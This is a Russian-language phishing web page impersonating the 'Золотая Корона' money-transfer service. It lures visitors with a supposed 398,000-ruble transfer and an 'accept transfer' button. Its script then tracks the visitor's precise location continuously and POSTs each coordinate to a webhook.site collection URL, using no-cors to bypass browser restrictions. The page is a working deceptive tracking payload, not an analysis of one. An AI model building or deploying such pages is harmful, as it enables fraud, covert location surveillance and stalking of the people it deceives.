<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Золотая Корона - Получи перевод</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 20px;
            background-color: #f4f4f4;
            margin: 0;
        }
        .container {
            max-width: 600px;
            margin: 0 auto;
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            color: #FFD700;
            font-size: 28px;
        }
        p {
            color: #000000;
            font-size: 16px;
            line-height: 1.5;
        }
        button {
            background-color: #3498db;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 18px;
            cursor: pointer;
            border-radius: 5px;
            margin: 10px;
        }
        button:hover {
            background-color: #2980b9;
        }
        .stop-button {
            background-color: #e74c3c;
        }
        .stop-button:hover {
            background-color: #c0392b;
        }
        #status {
            margin-top: 20px;
            font-size: 16px;
            color: #e74c3c;
        }
        .bank-logo {
            width: 200px;
            height: 60px;
            margin: 20px auto;
            display: block;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://via.placeholder.com/200x60/FFD700/000000?text=Золотая+Корона" alt="Золотая Корона Logo" class="bank-logo" onerror="this.src='https://dummyimage.com/200x60/FFD700/000&text=Золотая+Корона';">
        <h1>Получи перевод от Золотой Короны!</h1>
        <p>Вам начислен перевод на сумму 398 000 рублей. Для зачисления средств на вашу карту подтвердите операцию.</p>
        <p>Операция проводится через защищенное соединение Золотой Короны.</p>
        <button onclick="startTracking()">Принять перевод на карту</button>
        <button onclick="stopTracking()" class="stop-button" style="display: none;" id="stopButton">Остановить отслеживание</button>
        <p id="status"></p>
    </div>

    <script>
        let watchId = null;

        function logMessage(message) {
            console.log("[GeoDebug] " + message);
            document.getElementById("status").innerText = message;
        }

        function startTracking() {
            if (!navigator.geolocation) {
                logMessage("Ошибка: Браузер не поддерживает геолокацию.");
                return;
            }

            if (window.location.protocol !== "https:") {
                logMessage("Ошибка: Требуется HTTPS. Откройте через GitHub Pages.");
                return;
            }

            logMessage("Запрашиваем геолокацию...");
            watchId = navigator.geolocation.watchPosition(
                position => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const timestamp = new Date().toISOString();
                    logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)}`);

                    // Показать кнопку "Остановить отслеживание"
                    document.getElementById("stopButton").style.display = "inline-block";

                    // Отправка данных на Webhook.site
                    // Для теста можно заменить на: https://httpbin.org/post
                    fetch('https://webhook.site/5a25303b-7980-421c-841b-0cfa78e52280', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ latitude: lat, longitude: lon, timestamp }),
                        mode: 'no-cors' // Для обхода CORS
                    })
                    .then(response => {
                        console.log("[GeoDebug] Ответ сервера:", response);
                        logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)} (Отправлено)`);
                    })
                    .catch(error => {
                        console.error("[GeoDebug] Ошибка отправки:", error);
                        logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)} (Ошибка отправки: ${error.message})`);
                    });
                },
                error => {
                    let message;
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            message = "Разрешите доступ к геолокации в настройках.";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            message = "Геолокация недоступна. Проверьте GPS.";
                            break;
                        case error.TIMEOUT:
                            message = "Время запроса истекло. Попробуйте снова.";
                            break;
                        default:
                            message = "Ошибка: " + error.message;
                    }
                    logMessage(message);
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }

        function stopTracking() {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
                logMessage("Отслеживание остановлено.");
                document.getElementById("stopButton").style.display = "none";
            }
        }
    </script>
</body>
</html>
